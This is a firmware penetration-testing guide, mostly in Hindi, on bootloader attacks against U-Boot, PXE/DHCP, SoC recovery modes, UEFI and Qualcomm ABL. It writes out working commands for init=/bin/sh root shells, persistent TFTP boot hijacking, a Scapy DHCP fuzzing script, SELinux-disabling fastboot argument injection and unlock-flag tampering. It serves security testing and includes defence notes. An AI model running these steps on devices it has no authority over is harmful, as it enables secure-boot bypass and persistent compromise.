# बूटलोडर परीक्षण

{{#include ../../banners/hacktricks-training.md}}

निम्नलिखित कदम डिवाइस के स्टार्टअप कॉन्फ़िगरेशन बदलने और U-Boot तथा UEFI-class loaders जैसे बूटलोडर्स का परीक्षण करने के लिए सुझाए जाते हैं। लक्ष्य प्रारंभिक (early) कोड एक्सेक्यूशन हासिल करना, signature/rollback protections का आकलन करना, और recovery या network-boot पाथ्स का दुरुपयोग करना होना चाहिए।

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. Access the interpreter shell
- बूट के दौरान, `bootcmd` के execute होने से पहले किसी जाने-माने break key (अक्सर कोई भी key, 0, space, या बोर्ड-विशेष "magic" sequence) को दबाकर U-Boot prompt पर उतरें।

2. Inspect boot state and variables
- उपयोगी कमांड्स:
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Modify boot arguments to get a root shell
- `init=/bin/sh` जोड़ें ताकि kernel सामान्य init के बजाय shell पर जाएगा:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot from your TFTP server
- नेटवर्क कॉन्फ़िगर करें और LAN से एक kernel/fit image प्राप्त करें:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persist changes via environment
- यदि env storage write-protected नहीं है, तो आप नियंत्रण को स्थायी कर सकते हैं:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- उन variables की जाँच करें जैसे `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` जो fallback paths को प्रभावित करते हैं। गलत कॉन्फ़िगर किए गए मान अक्सर shell में बार-बार ब्रेक प्राप्त करने की अनुमति देते हैं।

6. Check debug/unsafe features
- देखें: `bootdelay` > 0, `autoboot` disabled, unrestricted `usb start; fatload usb 0:1 ...`, serial के माध्यम से `loady`/`loads` की क्षमता, untrusted media से `env import`, और बिना signature checks के लोड किए गए kernels/ramdisks।

7. U-Boot image/verification testing
- यदि प्लेटफार्म FIT images के साथ secure/verified boot का दावा करता है, तो unsigned और tampered images दोनों आज़माएँ:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` की अनुपस्थिति या legacy `verify=n` व्यवहार अक्सर arbitrary payloads बूट करने की अनुमति देता है।

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- U-Boot के legacy BOOTP/DHCP हैंडलिंग में memory-safety issues रहे हैं। उदाहरण के लिए, CVE‑2024‑42040 crafted DHCP responses के माध्यम से memory disclosure का वर्णन करता है जो U-Boot memory से bytes को वायर पर वापस leak कर सकता है। netboot के दौरान DHCP/PXE कोड पाथ्स को अत्यधिक लंबी/edge-case मानों (option 67 bootfile-name, vendor options, file/servername fields) के साथ एक्सरसाइज़ करें और हँग/लेक्स के लिए अवलोकन करें।
- Minimal Scapy snippet boot parameters को stress करने के लिए:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- यह भी सत्यापित करें कि क्या PXE filename fields shell/loader logic को बिना sanitization के पास किए जाते हैं जब वे OS-side provisioning scripts से chained हों।

9. Rogue DHCP server command injection testing
- एक rogue DHCP/PXE सर्वर सेट अप करें और filename या options फील्ड्स में characters inject करके देखे कि क्या बाद के बूट चेन स्टेजेस में command interpreters तक पहुँच बनती है। Metasploit’s DHCP auxiliary, `dnsmasq`, या custom Scapy scripts अच्छी तरह काम करते हैं। पहले लैब नेटवर्क को अलग करना सुनिश्चित करें।

## SoC ROM recovery modes that override normal boot

कई SoC एक BootROM "loader" मोड एक्सपोज़ करते हैं जो USB/UART के माध्यम से कोड स्वीकार करेगा भले ही flash images invalid हों। यदि secure-boot fuses नहीं फ्यूज किए गए हैं, तो यह chain में बहुत जल्दी arbitrary code execution प्रदान कर सकता है।

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` से custom U-Boot को RAM में push और run करें।
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` या `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` से एक loader stage करें और custom U-Boot upload करें।

जांचें कि क्या डिवाइस पर secure-boot eFuses/OTP जले हुए हैं। अगर नहीं, तो BootROM download modes अक्सर किसी भी higher-level verification (U-Boot, kernel, rootfs) को bypass कर देते हैं और आपका first-stage payload सीधे SRAM/DRAM से execute कर देते हैं।

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- EFI System Partition (ESP) को mount करके loader components की जाँच करें: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths।
- यदि Secure Boot revocations (dbx) current नहीं हैं, तो downgraded या known-vulnerable signed boot components के साथ बूट करने की कोशिश करें। यदि प्लेटफार्म पुराने shims/bootmanagers को अभी भी trust करता है, तो आप अक्सर ESP से अपना kernel या `grub.cfg` लोड करके persistence हासिल कर सकते हैं।

11. Boot logo parsing bugs (LogoFAIL class)
- कई OEM/IBV firmware DXE में image-parsing flaws के लिए vulnerable थे जो boot logos को process करते हैं। यदि attacker ESP पर vendor-specific path (जैसे `\EFI\<vendor>\logo\*.bmp`) पर crafted image रख सकता है और reboot कर सकता है, तो early boot के दौरान code execution संभव हो सकता है भले ही Secure Boot enabled हो। जांचें कि प्लेटफार्म user-supplied logos स्वीकार करता है और क्या वे paths OS से writable हैं।

## Android/Qualcomm ABL + GBL (Android 16) trust gaps

Android 16 डिवाइसों पर जो Qualcomm's ABL का उपयोग करते हैं Generic Bootloader Library (GBL) लोड करने के लिए, जाँचें कि ABL `efisp` partition से लोड किए जाने वाले UEFI app को authenticate करता है या नहीं। यदि ABL केवल UEFI app की presence की जाँच करता है और signatures verify नहीं करता, तो `efisp` में write primitive pre-OS unsigned code execution में बदल सकता है।

प्रैक्टिकल चेक्स और दुरुपयोग पाथ्स:

- efisp write primitive: आपको `efisp` में custom UEFI app लिखने का तरीका चाहिए (root/privileged service, OEM app bug, recovery/fastboot path)। इसके बिना GBL loading gap सीधे पहुँच योग्य नहीं है।
- fastboot OEM argument injection (ABL bug): कुछ builds `fastboot oem set-gpu-preemption` में अतिरिक्त tokens स्वीकार करते हैं और उन्हें kernel cmdline में जोड़ देते हैं। इसे permissive SELinux मजबूर करने के लिए उपयोग किया जा सकता है, जिससे protected partition writes सक्षम हो सकते हैं:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
यदि डिवाइस patched है, तो कमांड अतिरिक्त arguments को reject कर देना चाहिए।
- Bootloader unlock via persistent flags: एक boot-stage payload persistent unlock flags (जैसे `is_unlocked=1`, `is_unlocked_critical=1`) को flip कर सकता है ताकि `fastboot oem unlock` के बिना OEM server/approval gates के बराबर व्यवहार प्रदर्शित हो। यह अगली reboot के बाद स्थायी परिवर्तन होता है।

रक्षा/triage नोट्स:

- पुष्टि करें कि ABL `efisp` से GBL/UEFI payload पर signature verification करता है या नहीं। यदि नहीं, तो `efisp` को high‑risk persistence surface मानें।
- ट्रैक करें कि क्या ABL fastboot OEM handlers को argument counts validate करने और अतिरिक्त tokens reject करने के लिए patched किया गया है।

## Hardware caution

early boot के दौरान SPI/NAND flash के साथ इंटरैक्ट करते समय सतर्क रहें (उदा., reads bypass करने के लिए pins को ground करना) और हमेशा flash datasheet की सलाह लें। गलत समय पर किए गए shorts से डिवाइस या programmer corrupt हो सकते हैं।

## Notes and additional tips

- `env export -t ${loadaddr}` और `env import -t ${loadaddr}` प्रयोग करके environment blobs को RAM और storage के बीच स्थानांतरित करने का प्रयास करें; कुछ प्लेटफार्म removable media से बिना authentication के env import की अनुमति देते हैं।
- Linux-based systemen पर persistence के लिए जो `extlinux.conf` से बूट होते हैं, boot partition पर `APPEND` लाइन संशोधित करना (जैसे `init=/bin/sh` या `rd.break` inject करना) अक्सर पर्याप्त होता है जब कोई signature checks लागू नहीं होते।
- यदि userland में `fw_printenv/fw_setenv` उपलब्ध है, तो सत्यापित करें कि `/etc/fw_env.config` वास्तविक env storage से मेल खाता है। गलत कॉन्फ़िगर किए गए offsets आपको गलत MTD region पढ़ने/लिखने देते हैं।

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
{{#include ../../banners/hacktricks-training.md}}
